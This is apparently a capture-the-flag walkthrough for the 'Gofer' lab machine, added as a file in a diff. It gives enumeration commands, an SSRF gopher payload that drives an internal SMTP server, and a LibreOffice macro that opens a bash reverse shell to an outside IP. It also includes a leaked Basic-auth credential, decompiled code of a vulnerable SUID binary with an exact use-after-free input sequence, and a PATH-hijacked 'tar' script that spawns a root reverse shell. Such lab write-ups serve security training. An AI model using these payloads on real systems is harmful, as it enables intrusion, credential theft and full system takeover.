@@ -1,0 +1,298 @@
+# Enumeration
+nmap -sC -sV 10.10.11.225
+	shows an interesting samba server and a web application
+	
+gobuster dir -u http://gofer.htb -w /usr/share/wordlists/dirb/common.txt 
+gobuster vhost -u http://gofer.htb -w /usr/share/wordlists/seclists/subdomains-top1million-5000.txt --append-domain
+	there is only proxy.gofer.htb, which returns 401
+	
+Deeper analyse SAMBA:
+	nmap -p445 --script smb-protocols gofer.htb
+	nmap -p139 --script smb-protocols gofer.htb
+	smbmap -H gofer.htb -R
+	smbmap -H gofer.htb --download '.\shares\.backup\mail'
+
+Since there is nothing more, move on the web application:
+While navigating, I noticed that through GET and POST requests to the index of proxy.gofer.htb, shows permission denied
+POST /index.php shows missing parameter
+POST /index.php?url=http://localhost shows "Blacklisted keyword: localhost !"
+	same with 127.0.0.1
+-> Bypass it with POST /index.php?url=http://0.0.0.0 is ok
+
+
+# USER 1
+So, the goal is to exploit the url parameter to conduct SSRF attack and interact with SMTP (filtered) mail server on port 25 (according to https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2)
+Create a SSRF payload to send by mail to jhudson:
+	gopher://0.0.0.0:25/_HELO jdavis%0AMAIL FROM: <jdavis@gofer.htb>%0ARCPT TO: <jhudson@gofer.htb>%0ADATA%0ASubject: <a href="http://10.10.14.32:9000/bad.odt>clients.odt</a>%0ASSRF AND SMTP%0A.
+Now url-encode this and make an HTTP request to exploit the SSRF: POST /index.php?url=gopher%3A%2F%2F0.0.0.0%3A25%2F_HELO%20jdavis...
+
+Create an ODT file with a reverse shell through libreoffice: https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html and listen with netcat on 4242
+```
+Sub Main
+
+	Shell("bash -c 'bash -i >& /dev/tcp/10.10.14.32/4242 0>&1'")
+
+End Sub
+```
+
+
+# USER 2
+Upload linpeas.sh on the machine and launch it
+Appears tcpdump on the machine
+Launch: tcpdump -i any -s 0 -A
+While scrolling the data, I noticed one request which has 'Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk='
+Decode and get creds to access through SSH
+
+
+#ROOT
+find / -perm -4000 2>/dev/null
+	there is /usr/local/bin/notes
+Copy locally the executable
+	scp tbuckley@gofer.htb:/usr/local/bin/notes .
+
+While analyzing with ChatGPT, it shows there are multiple vulns
+
+```
+#include "out.h"
+
+// Initialize the program
+int initialize(EVP_PKEY_CTX *ctx)
+{
+  int gmon_start_result;
+  gmon_start_result = __gmon_start__();
+  return gmon_start_result;
+}
+
+// Placeholder function for unknown behavior
+void unknownFunction()
+{
+  // WARNING: Treating indirect jump as call
+  (*(code *)(undefined *)0x0)();
+  return;
+}
+
+// Custom memory deallocation function
+void customFree(void *__ptr)
+{
+  free(__ptr);
+  return;
+}
+
+// Custom print function
+int customPrint(char *__s)
+{
+  int printResult;
+  printResult = puts(__s);
+  return printResult;
+}
+
+// Get the user ID
+__uid_t getUserId()
+{
+  __uid_t userId;
+  userId = getuid();
+  return userId;
+}
+
+// Execute a system command
+int executeSystemCommand(char *__command)
+{
+  int commandResult;
+  commandResult = system(__command);
+  return commandResult;
+}
+
+// Custom printf function
+int customPrintf(char *__format, ...)
+{
+  int printfResult;
+  printfResult = printf(__format);
+  return printfResult;
+}
+
+// Custom memory initialization function
+void *customMemset(void *__s, int __c, size_t __n)
+{
+  void *memsetResult;
+  memsetResult = memset(__s, __c, __n);
+  return memsetResult;
+}
+
+// Compare two strings
+int stringCompare(char *__s1, char *__s2)
+{
+  int compareResult;
+  compareResult = strcmp(__s1, __s2);
+  return compareResult;
+}
+
+// Custom memory allocation function
+void *customMalloc(size_t __size)
+{
+  void *mallocResult;
+  mallocResult = malloc(__size);
+  return mallocResult;
+}
+
+// Set the group ID
+int setGroupId(__gid_t __gid)
+{
+  int setGidResult;
+  setGidResult = setgid(__gid);
+  return setGidResult;
+}
+
+// Custom scanf function
+void customScanf()
+{
+  __isoc99_scanf();
+  return;
+}
+
+// Exit the program
+void customExit(int __status)
+{
+  // WARNING: Subroutine does not return
+  exit(__status);
+}
+
+// Set the user ID
+int setUserId(__uid_t __uid)
+{
+  int setUidResult;
+  setUidResult = setuid(__uid);
+  return setUidResult;
+}
+
+// Program entry point
+void programStart(void)
+{
+  __uid_t userId;
+  int userChoice;
+  undefined4 localChoice;
+  void *userInfo;
+  void *userNote;
+
+  localChoice = 0;
+  userNote = (void *)0x0;
+  userInfo = (void *)0x0;
+
+  do {
+    customPrint(
+        "========================================\n1) Create a user and choose a username\n2) Show user information\n3) Delete a user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\n\n"
+    );
+    customPrintf("Your choice: ");
+    customScanf(&DAT_0010212b, &localChoice);
+    customPrint("");
+
+    switch (localChoice) {
+      default:
+        // WARNING: Subroutine does not return
+        customExit(0);
+      case 1:
+        userInfo = customMalloc(0x28);
+        if (userInfo == (void *)0x0) {
+          // WARNING: Subroutine does not return
+          customExit(-1);
+        }
+        customMemset(userInfo, 0, 0x18);
+        customMemset((void *)((long)userInfo + 0x18), 0, 0x10);
+        userId = getUserId();
+        if (userId == 0) {
+          *(undefined4 *)((long)userInfo + 0x18) = 0x696d6461;
+          *(undefined *)((long)userInfo + 0x1c) = 0x6e;
+        } else {
+          *(undefined4 *)((long)userInfo + 0x18) = 0x72657375;
+        }
+        customPrintf("Choose a username: ");
+        customScanf(&DAT_00102144, userInfo);
+        customPrint("");
+        break;
+      case 2:
+        if (userInfo == (void *)0x0) {
+          customPrint("First create a user!\n");
+        } else {
+          customPrintf("\nUsername: %s\n", userInfo);
+          customPrintf("Role: %s\n\n", (long)userInfo + 0x18);
+        }
+        break;
+      case 3:
+        if (userInfo != (void *)0x0) {
+          customFree(userInfo);
+        }
+        break;
+      case 4:
+        userNote = customMalloc(0x28);
+        customMemset(userNote, 0, 0x28);
+        if (userNote == (void *)0x0) {
+          // WARNING: Subroutine does not return
+          customExit(-1);
+        }
+        customPrint("Write your note:");
+        customScanf(&DAT_0010218b, userNote);
+        break;
+      case 5:
+        customPrintf("Note: %s\n\n", userNote);
+        break;
+      case 6:
+        customPrint("Coming soon!\n");
+        break;
+      case 7:
+        if (userNote != (void *)0x0) {
+          customFree(userNote);
+          userNote = (void *)0x0;
+        }
+        break;
+      case 8:
+        if (userInfo == (void *)0x0) {
+          customPrint("First create a user!\n");
+        } else {
+          int roleComparison = stringCompare((char *)((long)userInfo + 0x18), "admin");
+          if (roleComparison == 0) {
+            customPrint("Access granted!");
+            setUserId(0);
+            setGroupId(0);
+            executeSystemCommand("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
+          } else {
+            customPrint("Access denied: you don't have the admin role!\n");
+          }
+        }
+    }
+  } while (1);
+}
+
+void customCsuInit(EVP_PKEY_CTX *param_1, undefined8 param_2, undefined8 param_3)
+{
+  long lVar1;
+  initialize(param_1);
+  lVar1 = 0;
+  do {
+    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff, param_2, param_3);
+    lVar1 = lVar1 + 1;
+  } while (lVar1 != 1);
+  return;
+}
+
+void customCsuFini(void)
+{
+  return;
+}
+
+void finalize(void)
+{
+  return;
+}
+```
+
+To exploit them and gain admin permissions thanks to a buffer overlow, launch following input sequence:
+	1,test,3,4,012345678901234567890123admin,2
+Since we got admin permissions and the script now set the suid 0 and can launch a tar command, we create a "tar" file in one tmp dir (es: /home/tbuckley/tmp) with following content:
+```
+#!/bin/bash
+bash -c 'sh -i >& /dev/tcp/10.10.14.32/4444 0>&1'
+```
+Make it executable with `chmod +x tar`
+Listen on local machine with netcat on port 4444
+Launch again ./notes with the previous sequence to obtain admin perms and then execute backup function:
+	1,test,3,4,012345678901234567890123admin,2,8
+Get root reverse shell
